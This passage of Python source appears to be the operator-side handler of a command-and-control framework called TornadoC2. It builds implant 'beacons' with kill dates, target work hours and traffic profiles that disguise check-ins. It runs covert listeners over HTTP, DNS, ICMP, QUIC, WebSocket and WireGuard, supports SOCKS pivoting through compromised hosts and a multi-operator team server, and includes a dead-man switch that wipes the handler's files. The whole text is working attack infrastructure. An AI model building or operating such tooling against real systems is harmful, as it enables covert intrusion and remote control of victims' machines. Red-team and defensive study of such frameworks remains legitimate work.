                    mode='w', suffix='.pem', delete=False,
                    encoding='utf-8')
                tf.write(self.signer.public_pem)
                tf.close()
                pubkey_tmp = tf.name
                cfg.server_pubkey_path = pubkey_tmp
            except Exception as exc:
                print(f"{c['yellow']}[BEACON-BUILD] Could not stage "
                      f"server pubkey: {exc} — task signing will be "
                      f"disabled on the built agent{self.colors['end']}")
        else:
            print(f"{c['yellow']}[BEACON-BUILD] Handler signer is not "
                  f"active — tasks will not be signed{self.colors['end']}")

        # ---- mTLS bundle -------------------------------------------
        if params['use_mtls']:
            mtls_dir = params.get('mtls_dir')
            if mtls_dir:
                mtls_dir = os.path.expanduser(mtls_dir)
                default_cert = os.path.join(mtls_dir, 'client.pem')
                default_key = os.path.join(mtls_dir, 'client.key')
                default_ca = os.path.join(mtls_dir, 'ca.pem')
            else:
                default_cert = self.mtls_client_cert
                default_key = self.mtls_client_key
                default_ca = self.mtls_ca_cert

            cert_path = params.get('mtls_cert') or default_cert
            key_path = params.get('mtls_key') or default_key
            ca_path = params.get('mtls_ca') or default_ca

            needed = (cert_path, key_path, ca_path)
            if all(os.path.isfile(p) for p in needed):
                cfg.client_cert_path = cert_path
                cfg.client_key_path = key_path
                cfg.root_ca_path = ca_path
                print(f"{c['cyan']}[BEACON-BUILD] mTLS bundle:"
                      f"{c['end']}")
                print(f"{c['cyan']}  cert: {cert_path}{c['end']}")
                print(f"{c['cyan']}  key : {key_path}{c['end']}")
                print(f"{c['cyan']}  ca  : {ca_path}{c['end']}")
            else:
                missing = [p for p in needed
                           if not os.path.isfile(p)]
                print(f"{c['red']}[BEACON-BUILD] mTLS material missing:"
                      f"{c['end']}")
                for p in missing:
                    print(f"{c['red']}  {p}{c['end']}")
                if pubkey_tmp:
                    try:
                        os.remove(pubkey_tmp)
                    except OSError:
                        pass
                return

        # ---- C2 profile --------------------------------------------  
        _PROFILE_AWARE_TRANSPORTS = {
            'http', 'quic', 'websocket', 'dns', 'doh',
            'smb', 'tcp', 'tcprev',
        }
        c2_profile = None
        if (any(m in _PROFILE_AWARE_TRANSPORTS for m in _modes)
                and params.get('c2_profile')):
            try:
                from .beacon.builder import load_c2_profile
            except ImportError:
                load_c2_profile = None
            if load_c2_profile is not None:
                c2_profile = load_c2_profile(params['c2_profile'])
                if c2_profile is None:
                    print(f"{c['red']}[BEACON-BUILD] C2 profile "
                          f"'{params['c2_profile']}' not found"
                          f"{c['end']}")
                    return
                print(f"{c['cyan']}[BEACON-BUILD] Using C2 profile: "
                      f"{params['c2_profile']}{c['end']}")

        if c2_profile is None:
            c2_profile = {
                'user_agent': '',
                'linux_user_agent': '',
                'beacon_path': '/beacon',
                'tasks_path': '/tasks',
                'results_path': '/results',
                'extra_headers': {},
                'request_headers': {},
                'dns_label': {},
            }

        beacon_profile = c2_profile

        # ---- mTLS compatibility preflight --------------------------
        if params['use_mtls']:
            warn_lines = []

            if (getattr(self, 'beacon_mtls_ca', None) is None
                    and getattr(self, 'beacon_mtls_dir', None) is None):
                warn_lines.append(
                    "This build embeds an mTLS client bundle, but the "
                    "running beacon listener is NOT configured for "
                    "mTLS (no --beacon-mtls-ca or --beacon-mtls-dir at "
                    "handler start). The agent will reject the server "
                    "certificate chain on every check-in. Restart the "
                    "handler with matching mTLS flags, or rebuild "
                    "without --mtls."
                )
            else:
                build_dir = params.get('mtls_dir')
                if build_dir:
                    build_dir_norm = os.path.realpath(
                        os.path.expanduser(build_dir))
                else:
                    build_dir_norm = os.path.realpath(
                        self.mtls_cert_dir)

                handler_dir = getattr(
                    self, 'beacon_mtls_dir', None)
                if handler_dir:
                    handler_dir_norm = os.path.realpath(
                        os.path.expanduser(handler_dir))
                elif getattr(self, 'beacon_mtls_ca', None):
                    handler_dir_norm = os.path.realpath(
                        os.path.dirname(self.beacon_mtls_ca))
                else:
                    handler_dir_norm = None

                if (handler_dir_norm is not None
                        and handler_dir_norm != build_dir_norm):
                    warn_lines.append(
                        f"Bundle mismatch: this build uses "
                        f"{build_dir_norm}, but the running beacon "
                        f"listener is configured with "
                        f"{handler_dir_norm}. The agent's embedded CA "
                        f"will not match the server's chain. Either "
                        f"rebuild with --mtls-dir {handler_dir_norm}, "
                        f"or restart the handler with "
                        f"--beacon-mtls-dir {build_dir_norm} before "
                        f"deploying the agent."
                    )

                build_ca = params.get('mtls_ca')
                if not build_ca and params.get('mtls_dir'):
                    build_ca = os.path.join(build_dir_norm, 'ca.pem')
                if not build_ca:
                    build_ca = self.mtls_ca_cert
                handler_ca = (
                    os.path.join(handler_dir_norm, 'ca.pem')
                    if handler_dir_norm else self.beacon_mtls_ca
                )
                try:
                    if (build_ca and handler_ca
                            and os.path.isfile(build_ca)
                            and os.path.isfile(handler_ca)):
                        import hashlib as _hl
                        with open(build_ca, 'rb') as fh:
                            build_fp = _hl.sha256(
                                fh.read()).hexdigest()
                        with open(handler_ca, 'rb') as fh:
                            handler_fp = _hl.sha256(
                                fh.read()).hexdigest()
                        if build_fp != handler_fp:
                            warn_lines.append(
                                f"CA mismatch: the CA in this build "
                                f"({build_ca}, sha256 "
                                f"{build_fp[:16]}…) does not match "
                                f"the CA the beacon listener verifies "
                                f"against ({handler_ca}, sha256 "
                                f"{handler_fp[:16]}…). The handshake "
                                f"will fail regardless of directory "
                                f"names."
                            )
                except Exception:
                    pass

            if warn_lines:
                print(f"\n{c['yellow']}{c['bold']}"
                      f"[BEACON-BUILD] mTLS compatibility warning:"
                      f"{c['end']}")
                for line in warn_lines:
                    print(f"  {c['yellow']}⚠  {line}{c['end']}")
                print()
                try:
                    proceed = input(
                        f"  {c['yellow']}Continue build anyway? "
                        f"[y/N]{c['end']}: "
                    ).strip().lower()
                except (EOFError, KeyboardInterrupt):
                    print()
                    if pubkey_tmp:
                        try:
                            os.remove(pubkey_tmp)
                        except OSError:
                            pass
                    return
                if proceed not in ('y', 'yes'):
                    print(f"{c['cyan']}[BEACON-BUILD] Cancelled"
                          f"{c['end']}")
                    if pubkey_tmp:
                        try:
                            os.remove(pubkey_tmp)
                        except OSError:
                            pass
                    return

        # ---- Compile -----------------------------------------------
        print(f"\n{c['cyan']}[BEACON-BUILD] target={cfg.target_os}/"
              f"{cfg.target_arch}  format={cfg.output_format}  "
              f"profile={profile_name}  kill_days={cfg.kill_days}"
              f"{c['end']}")
        print(f"{c['cyan']}[BEACON-BUILD] transport="
              f"{cfg.transport_mode}{c['end']}")
        _modes = [m.strip() for m in cfg.transport_mode.split(',')
                  if m.strip()]
        if ('http' in _modes or 'quic' in _modes
                or 'websocket' in _modes):
            print(f"{c['cyan']}[BEACON-BUILD] url={cfg.url}"
                  f"{c['end']}")
            print(f"{c['cyan']}[BEACON-BUILD] tls_profile="
                  f"{cfg.tls_profile}{c['end']}")
        if 'dns' in _modes:
            print(f"{c['cyan']}[BEACON-BUILD] dns_zone="
                  f"{cfg.dns_domain}{c['end']}")
            if cfg.dns_resolver:
                print(f"{c['cyan']}[BEACON-BUILD] dns_resolver="
                      f"{cfg.dns_resolver}{c['end']}")
        if 'smb' in _modes:
            print(f"{c['cyan']}[BEACON-BUILD] smb_pipe="
                  f"{cfg.smb_pipe}{c['end']}")
        if 'tcp' in _modes:
            print(f"{c['cyan']}[BEACON-BUILD] tcp_bind="
                  f"{cfg.tcp_bind_addr}{c['end']}")
        if cfg.smb_relay_pipe:
            print(f"{c['cyan']}[BEACON-BUILD] smb_relay="
                  f"{cfg.smb_relay_pipe}{c['end']}")
        if cfg.work_hours_start == cfg.work_hours_end:
            print(f"{c['cyan']}[BEACON-BUILD] work_hours=off (24/7)"
                  f"{c['end']}")
        else:
            print(f"{c['cyan']}[BEACON-BUILD] work_hours="
                  f"{cfg.work_hours_start}-{cfg.work_hours_end}"
                  f" (target local time){c['end']}")
        if cfg.verbose:
            print(f"{c['yellow']}[BEACON-BUILD] verbose=on — debug "
                  f"build, leaves stderr traces on the target{c['end']}")
        else:
            print(f"{c['cyan']}[BEACON-BUILD] verbose=off{c['end']}")

        try:
            builder = BeaconBuilder(source_dir, output_dir)
        except RuntimeError as exc:
            print(f"{c['red']}[BEACON-BUILD] {exc}{c['end']}")
            if pubkey_tmp:
                try:
                    os.remove(pubkey_tmp)
                except OSError:
                    pass
            return

        try:
            out_path = builder.build(cfg, profile=beacon_profile)
        except subprocess.CalledProcessError as exc:
            print(f"{c['red']}[BEACON-BUILD] compile failed "
                  f"(exit {exc.returncode}){c['end']}")
            return
        except RuntimeError as exc:
            print(f"{c['red']}[BEACON-BUILD] {exc}{c['end']}")
            return
        finally:
            if pubkey_tmp:
                try:
                    os.remove(pubkey_tmp)
                except OSError:
                    pass

        if not out_path or not os.path.exists(out_path):
            print(f"{c['red']}[BEACON-BUILD] build reported success "
                  f"but no output file at {out_path!r} "
                  f"(output_dir={output_dir}){c['end']}")
            return

        size = os.path.getsize(out_path)
        print(f"{c['green']}[BEACON-BUILD] Built {out_path} "
              f"({self._format_size(size)}){c['end']}")

    # ------------------------------------------------------------------
    # Startup

    def start(self):
        """Start the beacon listener and drop into the operator loop."""
        self.print_banner()
        self.ensure_tls_certificates()
        self.ensure_mtls_certificates()
        self.ensure_pivot_keypair()

        try:
            from .beacon import (
                BeaconEngine, BeaconListener, BeaconConsole,
            )
        except ImportError as exc:
            print(f"{self.colors['red']}[BEACON] subsystem unavailable: "
                  f"{exc}{self.colors['end']}")
            print(f"{self.colors['yellow']}pip install flask "
                  f"cryptography{self.colors['end']}")
            return

        self.beacon = BeaconEngine(self)
        self.beacon_console = BeaconConsole(self.beacon, self)

        pivot_port = self.beacon_port + 1
        try:
            from .beacon.pivot import PivotManager
            pivot_bind = self.host
            pivot_advertise = self.host
            if pivot_advertise in ('0.0.0.0', '::'):
                try:
                    _probe = socket.socket(socket.AF_INET,
                                           socket.SOCK_DGRAM)
                    _probe.settimeout(1.0)
                    _probe.connect(('8.8.8.8', 1))
                    pivot_advertise = _probe.getsockname()[0]
                    _probe.close()
                except Exception:
                    pivot_advertise = '127.0.0.1'

            self._pivot_manager = PivotManager(
                self.beacon, pivot_bind, pivot_port,
                advertise_host=pivot_advertise)
            if self._pivot_manager.start():
                self.beacon.attach_pivot_manager(self._pivot_manager)
                print(f"{self.colors['green']}[PIVOT] listener on "
                      f"0.0.0.0:{pivot_port}{self.colors['end']}")
            else:
                print(f"{self.colors['yellow']}[PIVOT] listener "
                      f"failed to bind on port {pivot_port} — SOCKS5 "
                      f"pivoting will not be available"
                      f"{self.colors['end']}")
                self._pivot_manager = None
        except ImportError as exc:
            print(f"{self.colors['yellow']}[PIVOT] unavailable: "
                  f"{exc}{self.colors['end']}")
            self._pivot_manager = None

        beacon_ca = self.beacon_mtls_ca
        beacon_dir = self.beacon_mtls_dir
        beacon_sc = self.beacon_mtls_server_cert
        beacon_sk = self.beacon_mtls_server_key

        if beacon_dir:
            beacon_dir = os.path.expanduser(beacon_dir)
            beacon_ca = os.path.join(beacon_dir, 'ca.pem')
            server_cert = os.path.join(beacon_dir, 'server-mtls.pem')
            server_key = os.path.join(beacon_dir, 'server-mtls.key')
        elif beacon_ca:
            server_cert = beacon_sc or self.mtls_server_cert
            server_key = beacon_sk or self.mtls_server_key
        else:
            server_cert = self.certfile
            server_key = self.keyfile

        if beacon_ca:
            missing = [p for p in (beacon_ca, server_cert, server_key)
                       if not os.path.isfile(p)]
            if missing:
                print(f"{self.colors['red']}[BEACON] mTLS material "
                      f"missing:{self.colors['end']}")
                for p in missing:
                    print(f"  {self.colors['red']}{p}"
                          f"{self.colors['end']}")
                return

        self._beacon_listener = BeaconListener(
            self.beacon, self.host, self.beacon_port,
            server_cert, server_key,
            client_ca=beacon_ca,
            profile_filter=self.beacon_c2_profile,
        )
        if self._beacon_listener.start():
            print(f"{self.colors['green']}[BEACON] listening on "
                  f"{self.host}:{self.beacon_port}"
                  f"{self.colors['end']}\n")
        else:
            self._beacon_listener = None
            print(f"{self.colors['yellow']}[BEACON] listener failed "
                  f"(pip install flask){self.colors['end']}")
            return

        if self.dns_port and self.dns_domain:
            try:
                from .beacon.transport import DNSTransport
                dns_label_cfg = {}
                try:
                    import os as _os
                    import json as _json
                    from .beacon.builder import DEFAULT_C2_PROFILE_DIR

                    if self.beacon_c2_profile:
                        stem = (self.beacon_c2_profile[:-5]
                                if self.beacon_c2_profile.endswith('.json')
                                else self.beacon_c2_profile)
                        candidates = [stem + '.json']
                    else:
                        candidates = sorted(
                            e for e in _os.listdir(DEFAULT_C2_PROFILE_DIR)
                            if e.endswith('.json')
                            and not e.startswith('.')) \
                            if _os.path.isdir(DEFAULT_C2_PROFILE_DIR) else []

                    for name in candidates:
                        path = _os.path.join(DEFAULT_C2_PROFILE_DIR, name)
                        try:
                            with open(path, 'r', encoding='utf-8') as fh:
                                prof = _json.load(fh)
                        except (OSError, ValueError):
                            continue
                        block = prof.get('dns_label') or {}
                        if isinstance(block, dict) and block:
                            dns_label_cfg = block
                            break
                except Exception as exc:
                    print(f"{self.colors['yellow']}[BEACON] "
                          f"could not load dns_label config: {exc}"
                          f"{self.colors['end']}")

                cfg = {'domain': self.dns_domain}
                if dns_label_cfg:
                    cfg['dns_label'] = dns_label_cfg

                self._dns_transport = DNSTransport(
                    self.beacon, self.host, self.dns_port,
                    config=cfg)
                if self._dns_transport.start():
                    print(f"{self.colors['green']}[BEACON] DNS "
                          f"transport on {self.host}:{self.dns_port} "
                          f"zone={self.dns_domain}"
                          f"{self.colors['end']}\n")
                else:
                    print(f"{self.colors['yellow']}[BEACON] DNS "
                          f"transport failed to start — is the port "
                          f"in use, and is dnslib installed?"
                          f"{self.colors['end']}")
                    self._dns_transport = None
            except Exception as exc:
                print(f"{self.colors['yellow']}[BEACON] DNS "
                      f"transport error: {exc}{self.colors['end']}")
                self._dns_transport = None

        if self.icmp_enabled:
            try:
                from .beacon.transport.icmp import ICMPTransport
                self._icmp_transport = ICMPTransport(
                    self.beacon, self.host, 0, config={})
                if self._icmp_transport.start():
                    print(f"{self.colors['green']}[BEACON] ICMP "
                          f"transport active (raw socket)"
                          f"{self.colors['end']}\n")
                else:
                    print(f"{self.colors['yellow']}[BEACON] ICMP "
                          f"transport failed to start — run with "
                          f"sudo, or setcap cap_net_raw on the "
                          f"python binary"
                          f"{self.colors['end']}")
                    self._icmp_transport = None
            except Exception as exc:
                print(f"{self.colors['yellow']}[BEACON] ICMP "
                      f"transport error: {exc}"
                      f"{self.colors['end']}")
                self._icmp_transport = None

        if self.quic_port:
            try:
                from .beacon.transport.quic import QUICListener
                self._quic_listener = QUICListener(
                    self.beacon, self.host, self.quic_port,
                    server_cert, server_key,
                    client_ca=beacon_ca,
                    profile_filter=self.beacon_c2_profile,
                )
                if self._quic_listener.start():
                    print(f"{self.colors['green']}[BEACON] QUIC "
                          f"listener on {self.host}:{self.quic_port} "
                          f"(HTTP/3){self.colors['end']}\n")
                else:
                    print(f"{self.colors['yellow']}[BEACON] QUIC "
                          f"listener failed to start — is the port "
                          f"in use, and is aioquic installed? "
                          f"(pip install aioquic)"
                          f"{self.colors['end']}")
                    self._quic_listener = None
            except Exception as exc:
                print(f"{self.colors['yellow']}[BEACON] QUIC "
                      f"transport error: {exc}"
                      f"{self.colors['end']}")
                self._quic_listener = None

        if self.ws_port:
            try:
                from .beacon.transport.websocket import (
                    WebSocketListener, WebSocketServer,
                )
                ws_bind = self.ws_host or self.host
                self._ws_listener = WebSocketListener(
                    self.beacon, ws_bind, self.ws_port,
                    server_cert, server_key,
                    client_ca=beacon_ca,
                    profile_filter=self.beacon_c2_profile,
                )

                self._ws_server = WebSocketServer(self._ws_listener)
                if self._ws_server.start():
                    print(f"{self.colors['green']}[BEACON] "
                          f"WebSocket listener on {ws_bind}:"
                          f"{self.ws_port}{self.colors['end']}\n")
                else:
                    print(f"{self.colors['yellow']}[BEACON] "
                          f"WebSocket listener failed to start — "
                          f"is simple-websocket installed? "
                          f"(pip install simple-websocket)"
                          f"{self.colors['end']}")
                    self._ws_listener = None
                    self._ws_server = None
            except Exception as exc:
                print(f"{self.colors['yellow']}[BEACON] WebSocket "
                      f"transport error: {exc}"
                      f"{self.colors['end']}")
                self._ws_listener = None
                self._ws_server = None

        if self.wireguard_enabled:
            try:
                from .beacon.transport.wireguard import (
                    WireGuardTransport,
                )
                self._wireguard_transport = WireGuardTransport(
                    self.beacon, self.host, self.beacon_port,
                    config={
                        'port': self.wireguard_port,
                        'subnet': self.wireguard_subnet,
                        'server_ip': self.wireguard_server_ip,
                    })
                if self._wireguard_transport.start():
                    pub = self._wireguard_transport.server_pubkey()
                    print(f"{self.colors['green']}[BEACON] "
                          f"WireGuard listener on UDP "
                          f"{self.wireguard_port}"
                          f"{self.colors['end']}")
                    print(f"{self.colors['cyan']}[BEACON] server "
                          f"pubkey: {pub}{self.colors['end']}")
                    print(f"{self.colors['yellow']}Pin each agent "
                          f"with `wireguard add-peer <pubkey> "
                          f"<tunnel-ip>` after deployment."
                          f"{self.colors['end']}\n")
                else:
                    print(f"{self.colors['yellow']}[BEACON] "
                          f"WireGuard listener failed to start — "
                          f"requires root or CAP_NET_ADMIN, and "
                          f"pyroute2 (pip install pyroute2)"
                          f"{self.colors['end']}")
                    self._wireguard_transport = None
            except Exception as exc:
                print(f"{self.colors['yellow']}[BEACON] WireGuard "
                      f"transport error: {exc}"
                      f"{self.colors['end']}")
                self._wireguard_transport = None

        # ---- Team server (opt-in) -----------------------------------
        if self.operator_port:
            from .team.operators import OperatorRegistry
            from .team.audit import AuditLog, AuditChainError
            from .team.server import (
                OperatorListener, MultiplayerState,
            )

            self.operator_registry = OperatorRegistry()
            try:
                self.operator_registry.ensure_ca()
                self.operator_registry.ensure_server_cert()
            except RuntimeError as exc:
                print(f"{self.colors['red']}[TEAM] {exc}"
                      f"{self.colors['end']}")
                self.operator_registry = None
            else:
                try:
                    self.audit_log = AuditLog(
                        verify_on_start=not self.no_audit_verify)
                except AuditChainError as exc:
                    print(f"{self.colors['red']}[TEAM] {exc}"
                          f"{self.colors['end']}")
                    print(f"{self.colors['yellow']}To recover, move "
                          f"logs/audit/ aside and restart."
                          f"{self.colors['end']}")
                    self.audit_log = None

            if self.operator_registry and self.audit_log:
                self._multiplayer = MultiplayerState()
                if not self.multiplayer_off:
                    self._multiplayer.set_enabled(True)
                self.operator_listener = OperatorListener(
                    self.beacon, self.operator_host,
                    self.operator_port,
                    self.operator_registry, self.audit_log,
                    self._multiplayer)
                if self.operator_listener.start():
                    bind_note = ''
                    if self.operator_host in ('0.0.0.0', '::'):
                        bind_note = (' — exposed on every interface; '
                                     'confirm a firewall rule is in '
                                     'place')
                    if self._multiplayer.is_enabled():
                        state_note = (f"{self.colors['green']}"
                                      f"multiplayer ON"
                                      f"{self.colors['end']}")
                    else:
                        state_note = (f"{self.colors['yellow']}"
                                      f"multiplayer OFF — run "
                                      f"`multiplayer on` to accept "
                                      f"remote operators"
                                      f"{self.colors['end']}")
                    print(f"{self.colors['green']}[TEAM] operator "
                          f"listener on {self.operator_host}:"
                          f"{self.operator_port}  ({state_note})"
                          f"{bind_note}{self.colors['end']}")
                else:
                    print(f"{self.colors['yellow']}[TEAM] operator "
                          f"listener failed to start"
                          f"{self.colors['end']}")
                    self.operator_listener = None

                self._client_tunnel = None
                if self._pivot_manager is not None:
                    try:
                        from .beacon.client_tunnel import (
                            ClientTunnelListener,
                        )
                        tunnel_port = self.beacon_port + 2
                        self._client_tunnel = ClientTunnelListener(
                            self.beacon, '0.0.0.0', tunnel_port,
                            self.operator_registry.server_cert,
                            self.operator_registry.server_key,
                            client_ca=self.operator_registry.ca_cert,
                            registry=self.operator_registry)
                        if self._client_tunnel.start():
                            print(f"{self.colors['green']}[TUNNEL] "
                                  f"client tunnel on 0.0.0.0:"
                                  f"{tunnel_port} (mTLS, "
                                  f"capability beacon.socks)"
                                  f"{self.colors['end']}")
                        else:
                            print(f"{self.colors['yellow']}[TUNNEL] "
                                  f"listener failed to bind on "
                                  f"{tunnel_port}"
                                  f"{self.colors['end']}")
                            self._client_tunnel = None
                    except Exception as exc:
                        print(f"{self.colors['yellow']}[TUNNEL] "
                              f"listener failed: {exc}"
                              f"{self.colors['end']}")
                        self._client_tunnel = None

        self._init_readline()

        from .deadman import DeadmanSwitch
        deadman_config = os.path.join('.', 'team_ca', 'deadman.json')
        self.deadman = DeadmanSwitch(self, deadman_config)
        if self.deadman.enabled:
            s = self.deadman.status()
            warn_str = ', '.join(
                f"{int(f * 100)}%"
                for f in s['warn_fractions']) or 'none'
            print(f"{self.colors['yellow']}[DEADMAN] armed: "
                  f"{self.deadman._fmt_duration(s['window_seconds'])} "
                  f"window, warnings at {warn_str}, check every "
                  f"{s['check_seconds']:.0f}s"
                  f"{self.colors['end']}")

        self._main_loop()

    # ------------------------------------------------------------------
    # Dead-man's switch

    def _is_readonly_command(self, parts) -> bool:
        """True when the console line only reads state.

        Read-only commands do not bump the dead-man's switch.
        Otherwise `help`, `audit`, or `deadman status` typed
        idly would keep the server alive indefinitely, which
        is the opposite of what the switch is for.
        """
        if not parts:
            return True
        cmd = parts[0].lower()
        sub = parts[1].lower() if len(parts) > 1 else ''

        if cmd in ('help', 'exit', 'quit', 'q'):
            return True
        if cmd in ('beacons', 'bl'):
            return True
        if cmd == 'audit':
            return True
        if cmd == 'multiplayer':
            return sub in ('', 'status')
        if cmd == 'operator':
            return sub in ('', 'list', 'ls')
        if cmd == 'deadman':
            return sub in ('', 'status', 'show', 'info')

        return False

    def _touch_activity(self, source: str = 'operator') -> None:
        """Bumps the dead-man's switch. Safe to call before the
        switch is instantiated — the beacon listener and the local
        console can fire activity before start() reaches the
        construction site."""
        if self.deadman is not None:
            try:
                self.deadman.touch(source)
            except Exception:
                pass

    def _cmd_deadman(self, parts):
        """Thin dispatcher for the `deadman` console command. Every
        sub-verb is handled in tornadoc2/deadman.py."""
        if self.deadman is None:
            c = self.colors
            print(f"{c['yellow']}[DEADMAN] switch not initialised — "
                  f"the handler did not finish start(){c['end']}")
            return
        self.deadman.handle_command(parts)

    # ------------------------------------------------------------------
    # Main loop

    def _main_loop(self):
        c = self.colors
        while True:
            try:
                line = input(f"{c['green']}beacon> {c['end']}").strip()
            except (KeyboardInterrupt, EOFError):
                print()
                break
            if not line:
                continue
            parts = line.split()
            cmd = parts[0].lower()
            if not self._is_readonly_command(parts):
                self._touch_activity(source='local')

            if cmd in ('exit', 'quit', 'q'):
                break
            if cmd in ('beacons', 'bl'):
                try:
                    self.beacon_console.print_list()
                except Exception as exc:
                    print(f"{c['red']}Error: {exc}{c['end']}")
                continue
            if cmd == 'beacon':
                if len(parts) < 2:
                    print(f"{c['red']}Usage: beacon <ID>{c['end']}")
                    continue
                try:
                    sid = int(parts[1])
                except ValueError:
                    print(f"{c['red']}Invalid ID{c['end']}")
                    continue
                self.beacon_console.attach(sid)
                continue
            if cmd in ('beacon-build', 'bbuild'):
                self.beacon_build(parts)
                continue
            if cmd in ('beacon-rm', 'beacon-forget'):
                if len(parts) < 2:
                    print(f"{c['red']}Usage: beacon-rm <ID>{c['end']}")
                    continue
                try:
                    rm_id = int(parts[1])
                except ValueError:
                    print(f"{c['red']}Invalid ID{c['end']}")
                    continue
                sess = self.beacon.get(rm_id)
                if sess is None:
                    print(f"{c['red']}Beacon #{rm_id} not found"
                          f"{c['end']}")
                    continue
                try:
                    self.beacon.forget(rm_id)
                    print(f"{c['green']}Beacon #{rm_id} forgotten"
                          f"{c['end']}")
                except Exception as exc:
                    print(f"{c['red']}Could not forget: {exc}"
                          f"{c['end']}")
                continue
            if cmd in ('multiplayer', 'mp'):
                self._cmd_multiplayer(parts)
                continue
            if cmd == 'operator':
                self._cmd_operator(parts)
                continue
            if cmd == 'audit':
                self._cmd_audit(parts)
                continue
            if cmd == 'deadman':
                self._cmd_deadman(parts)
                continue
            if cmd == 'halt':
                self._cmd_halt(parts)
                continue
            if cmd in ('rotate-cookies', 'rotate'):
                if self.beacon is None:
                    print(f"{c['red']}beacon engine not running"
                          f"{c['end']}")
                    continue
                n = self.beacon.rotate_cookies()
                print(f"{c['green']}rotated cookie key — "
                      f"{n} session(s) will re-check-in on their "
                      f"next poll{c['end']}")
                if self.audit_log is not None:
                    try:
                        self.audit_log.write(
                            operator='__local__', role='local',
                            source_ip='local',
                            action='cookie.rotate',
                            detail=f'{n} sessions')
                    except Exception:
                        pass
                continue
            if cmd == 'recipes':
                self._recipes(parts)
                continue
            if cmd == 'help':
                self._print_help()
                continue

            print(f"{c['yellow']}Unknown command: {cmd}. "
                  f"Type `help`.{c['end']}")


    def _cmd_halt(self, parts):
        """halt [--force] [shutdown|reboot]

        Run the shutdown sequence immediately: stop every
        listener, wipe the entire TornadoC2 tree (the repository
        one directory above the handler's working directory,
        plus every state subdirectory under it), run the
        configured power action, exit.

        With no argument, uses whatever halt mode is currently
        set. `halt shutdown` and `halt reboot` set the mode for
        this run and then proceed.

        `--force` skips the confirmation prompt. Everything the
        handler owns is destroyed — the team CA, every operator
        certificate, both signing keys, the wire key, the audit
        log, every built agent, every staged payload. The
        repository is untouched.
        """
        c = self.colors
        if self.deadman is None:
            print(f"{c['yellow']}[DEADMAN] switch not initialised — "
                  f"the handler did not finish start(){c['end']}")
            return

        force = False
        mode_arg = None
        for arg in parts[1:]:
            a = arg.lower()
            if a in ('--force', '-f'):
                force = True
            elif a in ('shutdown', 'reboot', 'none', 'off'):
                mode_arg = a
            elif a in ('--help', '-h'):
                print(f"usage: halt [--force] "
                      f"[shutdown|reboot]")
                print(f"  {c['dim']}run the shutdown sequence now."
                      f"{c['end']}")
                return
            else:
                print(f"{c['red']}unknown flag: {arg}{c['end']}")
                return

        if mode_arg is not None:
            try:
                self.deadman.set_halt_mode(mode_arg)
            except ValueError as exc:
                print(f"{c['red']}{exc}{c['end']}")
                return

        current = self.deadman._halt_mode or 'none'
        if not force:
            if not sys.stdin.isatty():
                print(f"{c['red']}[DEADMAN] stdin is not a "
                      f"terminal; pass --force to confirm"
                      f"{c['end']}")
                return
            print()
            print(f"  {c['yellow']}this will:{c['end']}")
            print(f"    - stop every listener")
            print(f"    - wipe the entire TornadoC2 tree")
            print(f"      ({c['dim']}the repository at the "
                  f"directory one level above the handler's "
                  f"working directory, plus every state "
                  f"subdirectory under it{c['end']})")
            if current == 'reboot':
                print(f"    - {c['red']}reboot the machine{c['end']}")
            elif current == 'shutdown':
                print(f"    - {c['red']}power off the "
                      f"machine{c['end']}")
            else:
                print(f"    - exit the handler (no power action)")
            print()
            try:
                ans = input(
                    f"  {c['green']}proceed? [y/N]{c['end']} "
                ).strip().lower()
            except (EOFError, KeyboardInterrupt):
                print()
                return
            if ans not in ('y', 'yes'):
                print(f"{c['dim']}[DEADMAN] cancelled{c['end']}")
                return

        self.deadman.manual_halt(reason='console')

    # ------------------------------------------------------------------
    # Team server console commands

    def _verify_export_bundle(self, name, ca_pem, client_cert):
        """Return a list of problems with a config about to be
        exported. Empty list means the bundle is sound.

        Two checks:

          1. The CA in the config is the same CA the operator
             listener loaded into its SSL context at startup. A
             mismatch means team_ca/ca.pem was regenerated while
             the server was running — the config carries the new
             CA but the listener still trusts the old one.
          2. The client cert chains to the CA in the config. A
             failure means the operator's client.crt was minted
             under a different CA than the one being embedded.

        Either failure produces TLSV1_ALERT_UNKNOWN_CA on the
        client's first connection. Catching it here lets the
        operator fix it before the config is handed out."""
        problems = []
        import hashlib as _hl
        import ssl as _ssl

        # ---- 1. Config CA vs running listener CA --------------------
        try:
            cfg_fp = _hl.sha256(
                _ssl.PEM_cert_to_DER_cert(ca_pem)).hexdigest()
        except Exception as exc:
            problems.append(
                f"could not parse the config's CA: {exc}")
            cfg_fp = None

        listener_fp = None
        if self.operator_listener is not None:
            listener_fp = getattr(
                self.operator_listener,
                'ca_fingerprint_loaded', None)

        if cfg_fp and listener_fp and cfg_fp != listener_fp:
            problems.append(
                f"config CA sha256 {cfg_fp[:16]}… does not match "
                f"the running listener's CA sha256 "
                f"{listener_fp[:16]}…. team_ca/ca.pem was "
                f"regenerated while the server was running. "
                f"Restart the handler, then re-run "
                f"`operator export {name}`.")
        elif cfg_fp and not listener_fp:
            problems.append(
                "the running listener did not record its CA "
                "fingerprint at startup. Restart the handler "
                "to enable this check, then re-export.")

        # ---- 2. Client cert chains to the config's CA ---------------
        try:
            from cryptography import x509 as _x509
            from cryptography.hazmat.primitives.asymmetric \
                import padding as _padding
        except ImportError:
            _x509 = None
            _padding = None

        if _x509 is not None:
            try:
                ca_obj = _x509.load_pem_x509_certificate(
                    ca_pem.encode('utf-8'))
            except Exception as exc:
                problems.append(
                    f"CA is not valid X.509: {exc}")
                ca_obj = None
            try:
                leaf_obj = _x509.load_pem_x509_certificate(
                    client_cert.encode('utf-8'))
            except Exception as exc:
                problems.append(
                    f"client cert is not valid X.509: {exc}")
                leaf_obj = None
            if ca_obj is not None and leaf_obj is not None:
                try:
                    ca_obj.public_key().verify(
                        leaf_obj.signature,
                        leaf_obj.tbs_certificate_bytes,
                        _padding.PKCS1v15(),
                        leaf_obj.signature_hash_algorithm,
                    )
                except Exception as exc:
                    problems.append(
                        f"client cert does not chain to the "
                        f"config's CA: {exc}. {name}'s client.crt "
                        f"was minted under a different CA. Run "
                        f"`operator remove {name}`, then "
                        f"`operator add {name} operator`, then "
                        f"re-export.")

        return problems

    def _cmd_multiplayer(self, parts):
        c = self.colors
        if self._multiplayer is None:
            print(f"{c['yellow']}[TEAM] team server not running "
                  f"(restart with --operator-port <port>){c['end']}")
            return
        sub = parts[1].lower() if len(parts) > 1 else 'status'
        if sub in ('on', 'enable', 'start'):
            self._multiplayer.set_enabled(True)
            print(f"{c['green']}[TEAM] multiplayer ON — remote "
                  f"operator requests will be accepted{c['end']}")
        elif sub in ('off', 'disable', 'stop'):
